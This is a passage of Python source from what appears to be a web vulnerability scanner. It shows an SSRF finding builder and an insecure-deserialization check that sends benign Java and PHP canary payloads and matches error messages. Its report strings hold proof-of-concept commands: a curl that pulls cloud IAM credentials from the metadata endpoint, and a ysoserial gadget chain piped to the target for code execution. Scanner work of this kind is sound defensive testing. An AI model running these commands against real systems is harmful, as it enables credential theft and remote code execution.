    async def _send_url(
        self, ip: InsertionPoint, client: httpx.AsyncClient, ssrf_url: str
    ) -> httpx.Response | None:
        try:
            if ip.ip_type == IPType.QUERY_PARAM:
                url = self._build_url(ip, ssrf_url)
                return await client.get(url)
            elif ip.ip_type in (IPType.BODY_PARAM,):
                return await client.post(
                    ip.url,
                    data={ip.name: ssrf_url},
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                )
            elif ip.ip_type == IPType.JSON_KEY:
                return await client.request(
                    ip.method, ip.url,
                    json={ip.name: ssrf_url},
                    headers={"Content-Type": "application/json"},
                )
        except Exception:
            return None
        return None

    def _make_ssrf_finding(
        self, ip: InsertionPoint, payload: str, resp: httpx.Response, what: str
    ) -> CheckResult:
        return CheckResult(
            check_id=self.check_id,
            vulnerable=True,
            confidence=Confidence.CERTAIN,
            severity=Severity.CRITICAL,
            cvss=9.1,
            description=(
                f"SSRF confirmed via {what}! Parameter {ip.name!r} at {ip.url} "
                f"fetched {payload} server-side and returned the content. "
                f"Attacker can read cloud credentials, internal APIs, and pivot to internal network."
            ),
            evidence=self._make_evidence(
                request_raw=f"{ip.method} {ip.url} [{ip.name}={payload}]",
                response=resp,
                payload=payload,
                poc_curl=(
                    f"curl -s '{ip.url}' "
                    f"-d '{ip.name}=http://169.254.169.254/latest/meta-data/iam/security-credentials/'"
                ),
            ),
            insertion_point=ip,
        )


# ---------------------------------------------------------------------------
# Insecure Deserialization (A08)
# ---------------------------------------------------------------------------

class InsecureDeserCheck(BaseScanCheck):
    """
    A08: Tests for insecure deserialization in common formats.
    - Java: looks for 0xaced0005 magic bytes or base64-encoded Java serialization
    - PHP: sends O:8:"stdClass" payload
    - Python pickle: sends R-opcode payload
    Detection via error messages — these payloads cause errors in serialization libraries.
    """
    check_id = "insecure-deserialization"
    check_type = CheckType.ACTIVE
    name = "Insecure Deserialization"
    description = "Detects Java/PHP/Python deserialization of untrusted data"

    _attempted: bool = False

    # Java serialized canary (safe — just a serialized empty HashMap, triggers deser path)
    # rO0AB = base64(0xACED 0005 73...) Java serialization magic
    _JAVA_DESER_B64 = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADmphdmEubGFuZy5TdHJpbmcOKmv/c/fxaQIAAHhwAAZjYW5hcnlxAH4AA3g="

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        if insertion_point.ip_type not in (IPType.BODY_PARAM, IPType.JSON_KEY):
            return []
        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Java deserialization — send base64 serialized payload, detect by error
        java_error_patterns = [
            "java.io.StreamCorruptedException", "InvalidClassException",
            "ClassNotFoundException", "java.lang.ClassCast",
            "IOException: invalid stream header",
        ]

        php_error_patterns = [
            "unserialize(): Error", "PHP Warning: unserialize",
            "__destruct", "PHP Fatal error.*unserialize",
        ]

        payloads_and_errors = [
            (
                # Java serialized object in request body
                {"Content-Type": "application/x-java-serialized-object"},
                self._JAVA_DESER_B64,
                java_error_patterns,
                "Java",
            ),
            (
                # PHP serialized object
                {"Content-Type": "application/x-www-form-urlencoded"},
                f'{insertion_point.name}=O%3A8%3A"stdClass"%3A1%3A%7Bs%3A6%3A"canary"%3Bs%3A8%3A"desertst"%3B%7D',
                php_error_patterns,
                "PHP",
            ),
        ]

        for headers, payload, error_patterns, lang in payloads_and_errors:
            try:
                resp = await client.post(
                    insertion_point.url,
                    content=payload if lang == "Java" else payload.encode(),
                    headers=headers,
                )
                error_found = any(p.lower() in resp.text.lower() for p in error_patterns)
                if error_found:
                    return [CheckResult(
                        check_id=self.check_id,
                        vulnerable=True,
                        confidence=Confidence.FIRM,
                        severity=Severity.CRITICAL,
                        cvss=9.8,
                        description=(
                            f"{lang} deserialization vulnerability detected at {insertion_point.url}! "
                            f"Serialized {lang} object caused deserialization error. "
                            f"Using tools like ysoserial (Java) or PHPGGC (PHP), "
                            f"attacker can achieve RCE via gadget chains."
                        ),
                        evidence=self._make_evidence(
                            request_raw=(
                                f"POST {parsed.path} HTTP/1.1\n"
                                f"Content-Type: {headers.get('Content-Type', '')}"
                            ),
                            response=resp,
                            payload=payload[:80] + "...",
                            poc_curl=(
                                f"# Use ysoserial to generate gadget chain:\n"
                                f"java -jar ysoserial.jar CommonsCollections6 'id' | "
                                f"curl -s -X POST '{insertion_point.url}' "
                                f"-H 'Content-Type: application/x-java-serialized-object' "
                                f"--data-binary @-"
                            ),
                        ),
                        insertion_point=insertion_point,
                    )]
            except Exception:
                pass

        return []
